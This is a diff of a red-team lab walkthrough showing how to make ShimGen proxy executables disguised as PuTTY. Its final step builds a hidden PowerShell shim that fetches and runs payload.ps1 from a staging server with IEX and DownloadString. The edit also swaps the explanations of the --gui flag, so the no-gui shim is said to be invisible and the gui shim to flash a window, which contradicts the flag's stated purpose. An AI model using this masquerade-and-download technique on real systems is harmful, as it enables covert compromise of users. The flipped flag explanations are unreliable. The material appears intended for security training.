@@ -71,7 +71,7 @@ cd Desktop\Labs\ShimGenLab
 .\lab_start.ps1
 ```
 
-<img width="715" height="445" alt="image" src="https://github.com/user-attachments/assets/f3df3971-4e9e-4e92-a5f3-a21154db45a8" />
+<img width="698" height="492" alt="image" src="https://github.com/user-attachments/assets/5df6fd95-efcf-4903-80a4-e9dd12836d65" />
 
 Once you see the green **[✓]**, leave this Administrator terminal open — you will need it throughout the lab.
 
@@ -95,7 +95,7 @@ cd ~/BnB/ShimGen
 python3 -m http.server 8001
 ```
 
-<img width="680" height="177" alt="image" src="https://github.com/user-attachments/assets/af4ef690-0bf7-44ab-85e5-5b87377a4ec4" />
+<img width="654" height="113" alt="image" src="https://github.com/user-attachments/assets/a573514c-ac35-46d5-852a-66d98355e62b" />
 
 >[!NOTE]
 > Note down your **\<UBUNTU_IP\>** — you will need it in Phases 3 and 4.
@@ -122,6 +122,11 @@ Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/putty.ico"    -OutFile "C:\Users
 cd C:\Users\Public
 ```
 
+<img width="1652" height="176" alt="image" src="https://github.com/user-attachments/assets/755c8a41-48c8-4dd1-ae53-ce919d1cf22f" />
+
+You can check the status of the file transfers in the Ubuntu server terminal: 
+
+<img width="748" height="287" alt="image" src="https://github.com/user-attachments/assets/8b7ab58c-5a41-4a96-b3cc-5a0441973cf5" />
 
 ---
 
@@ -134,13 +139,17 @@ This is ShimGen at its simplest. In the **Windows powershell terminal**, generat
 .\test_basic.exe
 ```
 
+<img width="1191" height="572" alt="image" src="https://github.com/user-attachments/assets/f47e8ed8-62e1-4f0f-8db1-a502b750f1a0" />
+
 Notepad opens. Inspect the generated file:
 
 ```powershell
 (Get-Item ".\test_basic.exe").Length / 1KB
 ```
 
-The shim weighs approximately **14 KB** — a near-empty binary container. There is no Notepad code inside it. It simply stores a pointer and, at runtime, hands execution to whatever `--path` specified. This is the structural foundation every subsequent flag builds on.
+<img width="638" height="84" alt="image" src="https://github.com/user-attachments/assets/3b6b6a50-1da7-4fbe-a77c-fb877a128215" />
+
+The generated shim weighs approximately **240 KB** — a self-contained binary wrapper. While this size reflects statically linked C++ runtime libraries (ensuring the proxy runs reliably on any Windows build without missing DLL errors), **there is zero Notepad code inside it**. It simply stores a pointer and, at runtime, hands execution over to whatever `--path` specified. This is the structural foundation every subsequent flag builds on.
 
 ---
 
@@ -149,20 +158,24 @@ The shim weighs approximately **14 KB** — a near-empty binary container. There
 Compare execution visibility directly. First, generate a shim *without* `--gui`:
 
 ```powershell
-.\shimgen.exe --path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --command "-c `"Start-Sleep 2`"" --output ".\test_nogui.exe"
+.\shimgen.exe --path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --command '-c \"Start-Sleep 2\"' --output ".\test_nogui.exe"
 .\test_nogui.exe
 ```
 
-A black console window flashes on screen and disappears. For a victim, this is an immediate tell — something ran invisibly in the background.
+<img width="1295" height="184" alt="image" src="https://github.com/user-attachments/assets/f7bd027b-ab08-4cb9-9d3e-c7f8e02f8249" />
+
+Nothing. PowerShell sleeps for two seconds and exits with no visual trace whatsoever. This flag is the operational difference between an attack that causes the victim to pause and one that goes completely unnoticed.
 
 Now generate the same shim *with* `--gui`:
 
 ```powershell
-.\shimgen.exe --path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --command "-c `"Start-Sleep 2`"" --gui --output ".\test_gui.exe"
+.\shimgen.exe --path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --command '-c \"Start-Sleep 2\"' --gui --output ".\test_gui.exe"
 .\test_gui.exe
 ```
 
-Nothing. PowerShell sleeps for two seconds and exits with no visual trace whatsoever. This flag is the operational difference between an attack that causes the victim to pause and one that goes completely unnoticed. In any weaponized shim, `--gui` is non-negotiable.
+You will notice a powershell window pops up for about 2 seconds. For the victim, this is an idicator of compromise - something ran in the background.
+
+<img width="1773" height="835" alt="image" src="https://github.com/user-attachments/assets/970fc783-c8a4-4809-8598-3409e17de000" />
 
 ---
 
@@ -174,6 +187,8 @@ Verify that PuTTY is present on the machine before proceeding:
 Test-Path "C:\Program Files\PuTTY\putty.exe"
 ```
 
+<img width="747" height="113" alt="image" src="https://github.com/user-attachments/assets/adf4011b-7e95-455c-81c8-f5c8acbe101a" />
+
 Generate a shim that clones PuTTY's icon but runs `calc.exe` instead:
 
 ```powershell
@@ -181,9 +196,13 @@ Generate a shim that clones PuTTY's icon but runs `calc.exe` instead:
 .\rcedit.exe ".\test_icon.exe" --set-icon "C:\Users\Public\putty.ico"
 ```
 
+<img width="1219" height="165" alt="image" src="https://github.com/user-attachments/assets/d47f3768-9748-4ae0-a8fa-58bb020a6605" />
+
 Open **File Explorer** and navigate to `C:\Users\Public`. You will see `test_icon.exe` bearing the exact PuTTY terminal icon — blue, white, and yellow, pixel-for-pixel identical to the real SSH client in `Program Files`. Double-click it: the Windows Calculator opens.
 
 The filename and icon say PuTTY. The binary runs Calculator. The `rcedit` utility does not modify any functionality — it purely exploits the fact that users recognise applications by their icon before they read their filename, let alone inspect their internals.
+
+<img width="1260" height="714" alt="image" src="https://github.com/user-attachments/assets/1bb5702e-f98b-4dd6-88bb-7f6afd06323a" />
 
 >[!NOTE]
 > The `rcedit` utility applies standalone `.ico` files directly to the target PE binary. This means an attacker is not limited to impersonating applications that are already installed on the endpoint — icons can be pre-harvested and staged on the C2 server (like `putty.ico`) to clone any known application's visual identity, regardless of whether that application exists on the victim machine.
@@ -197,7 +216,7 @@ The `--command` flag bakes arbitrary arguments directly into the shim binary at 
 Generate a shim that passes a visible command to PowerShell to confirm the injection:
 
 ```powershell
-.\shimgen.exe --path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --command "-NoExit -c `"Write-Host 'Argument injected from inside the shim binary'`"" --output ".\test_cmd.exe"
+.\shimgen.exe --path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --command '-NoExit -c \"Write-Host ''Argument injected from inside the shim binary''\"' --output ".\test_cmd.exe"
 .\test_cmd.exe
 ```
 
@@ -230,7 +249,7 @@ With a clear understanding of each flag's effect, combine them into the final at
 # Generate the proxy executable
 .\shimgen.exe `
   --path    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
-  --command "-WindowStyle Hidden -ExecutionPolicy Bypass -c `"IEX(New-Object Net.WebClient).DownloadString('http://<UBUNTU_IP>:8001/payload.ps1')`"" `
+  --command '-WindowStyle Hidden -ExecutionPolicy Bypass -c \"IEX(New-Object Net.WebClient).DownloadString(''http://<UBUNTU_IP>:8001/payload.ps1'')\"' `
   --gui `
   --output  "C:\Users\Public\Desktop\putty.exe"
 
